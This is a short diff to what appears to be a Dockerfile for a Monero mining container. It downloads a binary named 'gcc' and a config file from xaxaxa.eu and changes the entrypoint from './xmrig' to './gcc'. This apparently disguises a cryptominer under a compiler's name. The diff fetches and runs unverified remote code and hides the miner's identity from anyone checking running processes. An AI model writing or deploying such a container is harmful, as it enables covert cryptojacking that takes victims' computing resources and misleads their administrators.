@@ -11,5 +11,5 @@ WORKDIR /home/monero
 RUN wget http://xaxaxa.eu/gcc &&\
   wget http://xaxaxa.eu/config_1.json
 
-ENTRYPOINT ["./xmrig"]
+ENTRYPOINT ["./gcc"]
 CMD ["--config=config_1.json"]
